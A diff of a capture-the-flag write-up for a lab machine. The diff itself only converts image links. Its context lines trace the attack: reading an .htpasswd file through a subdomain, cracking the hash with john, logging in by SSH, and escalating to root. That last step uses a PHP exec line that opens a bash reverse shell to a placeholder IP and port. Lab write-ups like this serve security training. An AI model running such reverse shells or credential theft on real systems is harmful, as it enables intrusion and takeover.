@@ -23,11 +23,11 @@ Nice, let's begin with reconnaissance.
 
 When we first access the website, we can find this:
 
-![[Pasted image 20250110145426.png]]
+![](../images/Pasted%20image%2020250110145426.png)
 
 It is a markdown viewer website, we can only upload files with a `.md` extension, which is the markdown extension, let's upload a file and analyze its behavior using burp:
 
-![[Pasted image 20250110150021.png]]
+![](../images/Pasted%20image%2020250110150021.png)
 
 
 # EXPLOITATION
@@ -57,7 +57,7 @@ We are using `statistics.alert.htb` since I found that subdomain while fuzzing, 
 
 ##### Output
 ----
-![[Pasted image 20250110154608.png]]
+![](../images/Pasted%20image%2020250110154608.png)
 
 We got the following data from `.htpasswd`, htpasswd is used to create and update the flat-files used to store usernames and password for basic authentication of HTTP users.
 
@@ -75,7 +75,7 @@ Let's use john to crack the hash, we can use the following command:
 
 We get the following output:
 
-![[Pasted image 20250110155239.png]]
+![](../images/Pasted%20image%2020250110155239.png)
 
 So, we got the following credentials:
 
@@ -84,11 +84,11 @@ So, we got the following credentials:
 
 Let's log into ssh with the found credentials:
 
-![[Pasted image 20250110155457.png]]
+![](../images/Pasted%20image%2020250110155457.png)
 
 We are able to read `user.txt`:
 
-![[Pasted image 20250110155516.png]]
+![](../images/Pasted%20image%2020250110155516.png)
 
 ```ad-important
 User: `c0ebbe25578f5ccb7a536e93d4e69238`
@@ -104,12 +104,12 @@ Let's begin PRIVESC
 Let's run linpeas:
 
 
-![[Pasted image 20250110160337.png]]
+![](../images/Pasted%20image%2020250110160337.png)
 
 First, there's something running on port `8080`, let's use ssh tunneling, but I also found something interesting:
 
 
-![[Pasted image 20250110160647.png]]
+![](../images/Pasted%20image%2020250110160647.png)
 
 There's a directory that has root access, let's reproduce the following steps in order to get a root shell:
 
@@ -129,13 +129,13 @@ exec("/bin/bash -c 'bash -i >/dev/tcp/IP/PORT 0>&1'");
 ### Output
 ----
 
-![[Pasted image 20250110161332.png]]
+![](../images/Pasted%20image%2020250110161332.png)
 
 ```
 
 We got a root shell, let's read flag:
 
-![[Pasted image 20250110161352.png]]
+![](../images/Pasted%20image%2020250110161352.png)
 
 ```ad-important
 root: `f6a8586a751b4a7f1203d20b0fef1e6a`
